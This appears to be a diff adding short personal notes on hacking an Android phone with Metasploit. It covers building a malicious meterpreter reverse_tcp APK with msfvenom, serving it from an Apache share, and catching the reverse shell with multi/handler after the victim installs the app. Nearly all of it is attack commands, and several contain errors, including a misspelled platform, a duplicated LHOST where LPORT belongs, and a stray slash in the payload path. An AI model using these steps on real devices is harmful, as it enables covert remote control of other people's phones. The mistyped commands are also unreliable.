@@ -1,0 +1,29 @@
+* Adding IP address to android phone:
+    - Open terminal emulator in android and type below command:
+        # sudo ip addr add <ip>/mask dev eth0
+        This will assign the given ip to the android device  
+
+* Ceating malicious payload for android:
+    - In kali linux, run the prostgresql service.
+        # service postgresql start
+    - We will use the android/meterpreter/reverse_tcp payload
+    - Type below command to create a malicious android payload 
+        # msfvenom -p /android/meterpreter/reverse_tcp --platform adnroid -a dalvik LHOST=<own_ip> LHOST=<own_port> R > </output/file/path>.apk
+    Above coammdn will create a malicious .apk File
+
+* Share the malicious file on linux:
+    # mkdir /var/www/html/share
+    # chmdo -R 755 /var/www/html/share
+    # chown -R www-data:www-data /var/www/html/share
+    # cp <name>.apk /var/www/html/share
+    - Start the apache service:
+        # service apache2 start
+
+* Take the reverse connection using metasploit:
+    - Run msfconsole
+    # use exploit/multi/handler
+    # set payload android/meterpreter/reverse_tcp
+    # set lhost
+    # set lport
+
+Install the application in the android phone and you will get a session at metasploit
